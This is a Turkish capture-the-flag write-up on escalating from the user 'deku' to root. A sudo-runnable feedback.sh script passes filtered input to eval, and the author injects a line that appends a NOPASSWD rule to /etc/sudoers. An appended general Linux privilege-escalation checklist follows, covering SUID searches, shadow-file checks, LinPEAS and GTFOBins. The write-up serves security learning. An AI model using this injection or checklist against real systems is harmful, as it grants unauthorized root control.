# Privilege Escalation: Deku Kullanıcısından Root Yetkilerine Yükselme

Bu yazıda, bir CTF senaryosunda `deku` kullanıcısı ile bir Linux makinesine SSH ile bağlandıktan sonra sudo yetkilerini kullanarak nasıl root erişimi sağladığımı adım adım açıklıyorum.

---

## 1. `sudo -l` Çıktısının Analizi

İlk olarak `sudo -l` komutunu çalıştırdım. Bu komut, `deku` kullanıcısının hangi komutları `sudo` yetkisiyle çalıştırabileceğini listeler:

```bash
sudo -l
```
Çıktı şu şekildeydi:


```bash
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
Buradan, deku kullanıcısının /opt/NewComponent/feedback.sh betiğini sudo yetkileriyle çalıştırabildiğini öğrendim. Bu, potansiyel bir yetki yükseltme (privilege escalation) açığı olabileceğini gösteriyordu.
```
2. feedback.sh Betiğinin Analizi
Betik dosyasını incelediğimde şu kodları buldum:

```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback

if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```
Öne Çıkan Satır:
```bash

eval "echo $feedback"
```
Bu satır, kullanıcıdan alınan girdiyi eval komutuyla çalıştırıyor. Ancak, belirli karakterleri (\ ) ; | gibi) filtrelemeye çalışarak komut enjeksiyonunu engellemeyi hedefliyor. Fakat eval kullanımı nedeniyle bu betik hâlâ saldırıya açık.

3. Betiği sudo ile Çalıştırma
Betiği sudo ile çalıştırdım:

``` bash

sudo ./feedback.sh
```
Bu işlem, betiği root yetkileriyle çalıştırmamı sağladı. Betik çalıştırıldığında benden şu girdi istendi:

bash
Copy code
Enter your feedback:
4. Girdi Manipülasyonu: Sudoers Dosyasını Düzenleme
Girdi olarak şu komutu yazdım:

``` bash
deku ALL=NOPASSWD: ALL >> /etc/sudoers
Bu Komutun Amacı:
deku ALL=NOPASSWD: ALL: Bu satır, "deku" kullanıcısına hiçbir parola sormadan (NOPASSWD) herhangi bir komutu (ALL) sudo yetkisiyle çalıştırma izni verir.
>> /etc/sudoers: Bu komut, yukarıdaki yetkiyi /etc/sudoers dosyasına ekler. /etc/sudoers, kullanıcıların sudo yetkilerini yöneten kritik bir dosyadır.
Betiğin eval satırı sayesinde bu komut root yetkisiyle çalıştı ve /etc/sudoers dosyasına gerekli satırı ekledim.
```
5. Yetki Yükseltme: Root Erişimi Sağlama
Artık "deku" kullanıcısı hiçbir parola girmeden root yetkisiyle komut çalıştırabiliyordu. Aşağıdaki komutu kullanarak root erişimi sağladım:

``` bash
sudo /bin/bash
```
Bu komut, root yetkileriyle bir bash shell başlattı ve sistem üzerinde tam kontrol elde ettim.

6. Neden Bu Adımları Yaptım?
Açıkların Kullanımı:
feedback.sh betiğindeki eval satırı, kullanıcı girdisini doğrudan çalıştırdığı için komut enjeksiyonuna açıktı.
Sudo yetkisiyle çalıştırılabilen bu betiği kullanarak /etc/sudoers dosyasına yetki satırı ekledim.
Hedef:
Bu adımlarla, düşük yetkilere sahip bir kullanıcıdan (deku) root erişimi elde ettim. Bu, CTF çözümlerinde sıkça karşılaşılan bir yetki yükseltme tekniğidir.

7. Çıkarılan Dersler
Bu senaryoda şu güvenlik açıkları göze çarpmaktadır:

eval Kullanımı: Kullanıcı girdisini doğrudan çalıştırmak ciddi bir güvenlik riskidir. eval komutunun kullanılması kesinlikle önerilmez.
Sudo Yetkilerinin Yanlış Yapılandırılması: sudo yetkisiyle çalıştırılabilen bir betik, root erişimine açık bir kapı oluşturmuştur.
Girdi Filtrelemenin Yetersizliği: Filtreleme işlemi bazı özel karakterleri engellese de saldırıyı tamamen önleyememiştir.
Güvenlik Önerileri:
Kullanıcı girdilerini çalıştırmadan önce dikkatlice sanitize edin.
eval kullanmaktan kaçının; bunun yerine güvenli alternatifler tercih edin.
Sudo yetkilerini minimum seviyede tutun ve gereksiz betikleri sudo ile çalıştırılabilir hale getirmeyin.
Özet
Bu senaryoda:

``` bash
sudo -l
````

 ile deku kullanıcısının sudo yetkilerini keşfettim.
feedback.sh betiğini inceledim ve komut enjeksiyonu yaparak sudoers dosyasını düzenledim.
Son olarak, root yetkileriyle bir shell açarak tam kontrol sağladım.
Bu çözüm, hem CTF çözümleme pratiği hem de gerçek dünyada güvenlik açıklarını anlamak için oldukça öğreticidir.
/
Reverse shell aldıktan sonra root yetkisine ulaşmak (privilige escalation) için izleyebileceğiniz birkaç adım bulunmaktadır. İşte izleyebileceğiniz bir yol haritası:

*1. Sistem Bilgilerini Toplama*
Öncelikle sistem hakkında bilgi toplamanız gerekmektedir:
- *Kernel Versiyonu*: `uname -a`
- *İşletim Sistemi ve Dağıtımı*: `cat /etc/os-release` veya `cat /etc/issue`
- *Kullanıcı Bilgileri*: `id` ve `whoami`

*2. Konfigürasyon Dosyalarını Kontrol Etme*
Sistem konfigürasyon dosyalarını kontrol ederek potansiyel zafiyetleri belirleyin:
- *Sudoers Dosyası*: `cat /etc/sudoers` ve `sudo -l` komutlarını kullanarak, sudo yetkilerine sahip olup olmadığınızı kontrol edin.
- *Setuid Bit*: `find / -perm -4000 -type f 2>/dev/null` komutu ile Setuid bit'ine sahip dosyaları arayın.

*3. Yaygın Güvenlik Zafiyetlerini Araştırma*
Yaygın güvenlik zafiyetlerini kontrol edin:
- *Sudo İstismarları*: `sudo -l` komutunu kullanarak sudo yetkilerine sahip olduğunuz programları kontrol edin. Bu programlar üzerinden zafiyet olup olmadığını araştırın.
- *Cron Job'lar*: `cat /etc/crontab` ve `ls -la /etc/cron.*` komutları ile cron job'larını kontrol edin.
- *Zayıf Dosya İzinleri*: Kritik konfigürasyon dosyalarında zayıf dosya izinlerini kontrol edin. (örneğin, `/etc/passwd` ve `/etc/shadow`)

*4. Local Exploitler*
Kernel exploitleri ve local exploitleri kullanarak yetki yükseltme işlemi gerçekleştirebilirsiniz:
- *Exploit DB*: [Exploit DB](https://www.exploit-db.com/) üzerinde işletim sisteminiz ve kernel versiyonunuz için uygun exploitleri araştırın.
- *GTFOBins*: [GTFOBins](https://gtfobins.github.io/) üzerinde setuid bit'ine sahip dosyalar veya sudo yetkisine sahip programlar için uygun exploit tekniklerini araştırın.

*5. Otomatik Araçlar Kullanma*
Yetki yükseltme işlemlerini otomatik olarak gerçekleştirebilecek araçlar:
- *LinPEAS*: [LinPEAS](https://github.com/carlospolop/PEASS-ng) aracını kullanarak sistemdeki potansiyel zafiyetleri tarayın.
- *Les (Linux Exploit Suggester)*: [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) aracını kullanarak kernel exploitlerini tespit edin.

*Örnek Bir Exploit Kullanma*
Örneğin, `sudo` yetkisine sahip bir program üzerinden yetki yükseltme:
```bash
sudo <program> /bin/sh
```

